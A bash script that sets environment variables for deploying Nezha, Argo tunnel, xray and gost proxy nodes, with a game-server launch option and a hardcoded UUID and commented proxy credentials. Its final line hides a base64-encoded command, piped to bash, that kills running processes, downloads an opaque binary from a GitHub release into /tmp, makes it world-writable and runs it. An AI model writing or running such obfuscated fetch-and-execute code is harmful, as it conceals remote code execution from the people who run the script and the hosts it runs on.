#!/bin/bash
 
# export TOK=${TOK:-'xccxx'}  # token或json,可以直接复制全部，建议使用json，可以免设置端口
# export ARGO_DOMAIN=${ARGO_DOMAIN:-'webhost.vivokf.cloudns.be'}

export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-''}
export NEZHA_TLS=${NEZHA_TLS:-''}

export TMP_ARGO=${TMP_ARGO:-'vms'}
export UUID="1b54d55e-4355-4563-aaf5-757bb845d923"
export VL_PORT=${VL_PORT:-'8002'}
export VM_PORT=${VM_PORT:-'8001'}
export CF_IP=${CF_IP:-'ip.sb'}
export SUB_NAME=${SUB_NAME:-'webhost'}
# export second_port=""  #设置第二个端口，个别玩具可以开启第二个端口

# export S_IP="116.11.19" #要转发的socks5地址
# export S_PORT="1077"  #要转发的socks5端口
# export S_USER="5a99dfcfa6"
# export S_PASS="5a991d-1dea6"

# 设置端口转发参数(去掉#开启)
# export third_port=""  # 本机中转端口
# export SIP_PORT=""  # 目标ip和端口，格式ip:端口，如1.1.1.1:443

# 设置节点上传地址(需配合订阅服务器)
# export SUB_URL="" 

# 设置程序名称
#export ne_file=""   #nezha
#export cff_file=""   #Argo
#export web_file=""   #xray
#export gost_file=""   #gost

# 游戏相关设置(去掉#开启游戏，复制启动命令填在下面)
# export JAR_SH='java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar senver.jar'  # 启动命令，命令中文件名称改为senver.jar,原游戏jar文件改名为senver.jar

# 设置文件保存位置
#export FLIE_PATH="$PWD/worlds/"

# 启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
